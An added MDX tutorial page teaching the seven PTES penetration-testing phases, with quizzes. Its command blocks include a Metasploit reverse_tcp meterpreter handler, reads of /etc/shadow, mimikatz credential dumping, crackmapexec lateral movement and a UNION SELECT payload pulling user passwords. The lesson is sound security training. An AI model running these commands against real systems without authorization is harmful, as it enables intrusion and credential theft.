@@ -1,0 +1,227 @@
+---
+title: The Penetration Testing Lifecycle
+description: A structured methodology for conducting professional penetration tests.
+---
+
+# The Penetration Testing Lifecycle
+
+Professional penetration testing follows a structured methodology. Without a framework, you'll miss critical attack vectors, produce inconsistent results, and deliver reports that don't hold up to scrutiny. The **Penetration Testing Execution Standard (PTES)** is the industry-standard framework.
+
+## The 7 Phases of PTES
+
+```
+1. Pre-engagement Interactions
+        ↓
+2. Intelligence Gathering (Recon)
+        ↓
+3. Threat Modeling
+        ↓
+4. Vulnerability Analysis
+        ↓
+5. Exploitation
+        ↓
+6. Post Exploitation
+        ↓
+7. Reporting
+```
+
+## Phase 1: Pre-engagement Interactions
+
+Before sending a single packet, establish the legal and operational framework.
+
+### Scope Definition
+```
+In-Scope:
+  - IP ranges: 10.10.10.0/24, 192.168.1.0/24
+  - Domains: target.com, *.target.com
+  - Applications: https://app.target.com
+
+Out-of-Scope:
+  - Third-party services (AWS, Cloudflare)
+  - Production database servers
+  - 10.10.10.1 (CEO's workstation)
+```
+
+### Rules of Engagement (RoE)
+- Testing hours: Monday-Friday, 9am-5pm EST
+- Social engineering: Permitted / Not permitted
+- Denial of Service: Not permitted
+- Physical access: Not permitted
+- Emergency contact: security@target.com, +1-555-0100
+
+### Key Documents
+- **Statement of Work (SOW):** What you'll do and what you'll deliver
+- **Non-Disclosure Agreement (NDA):** Protects both parties
+- **Authorization Letter:** Written proof you're allowed to test
+
+<InfoBox type="warning">
+Testing out of scope is a crime. If the client authorizes 10.10.10.5 but you attack 10.10.10.6, you're violating the CFAA (US), Computer Misuse Act (UK), or equivalent laws globally. Always verify scope in writing before every test.
+</InfoBox>
+
+## Phase 2: Intelligence Gathering
+
+Maximize your knowledge of the target before touching it.
+
+### Passive Recon (No target interaction)
+```bash
+# WHOIS, DNS, certificate transparency
+whois target.com
+dig target.com ANY
+curl "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value'
+
+# Google dorking
+site:target.com filetype:pdf
+site:target.com intitle:"index of"
+
+# Shodan
+org:"Target Company" port:22
+```
+
+### Active Recon (Direct target interaction)
+```bash
+# Port scanning
+sudo nmap -sS -p- --min-rate 5000 10.10.10.5 -oN ports.txt
+
+# Service enumeration
+sudo nmap -sC -sV -p 22,80,443 10.10.10.5 -oN services.txt
+
+# Web enumeration
+gobuster dir -u http://10.10.10.5 -w /usr/share/seclists/Discovery/Web-Content/common.txt
+```
+
+## Phase 3: Threat Modeling
+
+Analyze gathered intelligence to prioritize attack vectors.
+
+**Questions to answer:**
+- What are the crown jewels? (Customer data, financial records, IP)
+- What's the most likely attack path to reach them?
+- What would a ransomware group do first?
+- What's the blast radius if the web server is compromised?
+
+**Attack path example:**
+```
+External web app → SQLi → DB credentials → Internal SSH → Pivot → AD → Domain Admin
+```
+
+## Phase 4: Vulnerability Analysis
+
+Identify specific exploitable flaws.
+
+```bash
+# Automated scanning
+nessus / openvas / nuclei
+
+# Manual verification
+# Don't trust scanner output blindly — verify every finding
+
+# Example: Verify SQLi manually
+curl "http://target.com/product?id=1'"
+# If SQL error → confirmed vulnerable
+
+# Check CVEs for discovered versions
+searchsploit apache 2.4.49
+# Or: https://nvd.nist.gov/vuln/search
+```
+
+## Phase 5: Exploitation
+
+Gain access by exploiting confirmed vulnerabilities.
+
+```bash
+# Metasploit example
+msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 10.10.14.5
+set LPORT 4444
+run
+
+# Manual exploitation
+python3 exploit.py --target 10.10.10.5 --lhost 10.10.14.5 --lport 4444
+```
+
+**Key principles:**
+- Exploit only what's in scope
+- Document every action with timestamps
+- Prefer non-destructive exploits
+- Have a rollback plan for risky actions
+
+## Phase 6: Post Exploitation
+
+Demonstrate the real-world impact of the compromise.
+
+```bash
+# Privilege escalation
+sudo -l                    # Linux
+whoami /priv               # Windows
+
+# Credential harvesting
+cat /etc/shadow            # Linux password hashes
+mimikatz # sekurlsa::logonpasswords  # Windows
+
+# Lateral movement
+crackmapexec smb 192.168.1.0/24 -u admin -p 'Password123'
+
+# Data exfiltration (proof of concept only)
+# Document what COULD be exfiltrated, don't actually exfiltrate sensitive data
+```
+
+## Phase 7: Reporting
+
+The most important deliverable. If it's not in the report, it didn't happen.
+
+### Report Structure
+
+**Executive Summary** (for management)
+- Business risk in plain language
+- Financial impact estimates
+- Top 3 critical findings
+- Overall risk rating
+
+**Technical Findings** (for engineers)
+- Finding title and severity (Critical/High/Medium/Low/Info)
+- CVSS score
+- Affected systems
+- Proof of concept (screenshots, commands)
+- Step-by-step reproduction
+- Remediation recommendations
+
+**Finding Template:**
+```
+Title: SQL Injection in /search endpoint
+Severity: Critical (CVSS 9.8)
+Affected: https://app.target.com/search?q=
+
+Description:
+The search parameter is vulnerable to SQL injection, allowing
+an unauthenticated attacker to extract the entire database.
+
+Proof of Concept:
+1. Navigate to: https://app.target.com/search?q=' UNION SELECT 1,username,password,4 FROM users--
+2. Observe: All user credentials returned in response
+
+Impact:
+Complete database compromise, including 50,000 user credentials.
+
+Remediation:
+Use parameterized queries (prepared statements) for all database queries.
+```
+
+<Quiz
+  question="Which phase of the penetration testing lifecycle defines the scope and rules of engagement?"
+  answer="Pre-engagement Interactions"
+  hint="This is the first phase — before any technical work begins."
+/>
+
+<Quiz
+  question="What document provides written proof that you're authorized to perform the penetration test?"
+  answer="Authorization Letter (or Statement of Work)"
+  hint="Always get written authorization before testing — verbal permission is not sufficient."
+/>
+
+<Quiz
+  question="Why must every scanner finding be manually verified before including it in a report?"
+  answer="To eliminate false positives — scanners report vulnerabilities based on version banners, not actual exploitation"
+  hint="A scanner seeing 'Apache 2.4.49' assumes it's vulnerable, but the patch may have been backported."
+/>
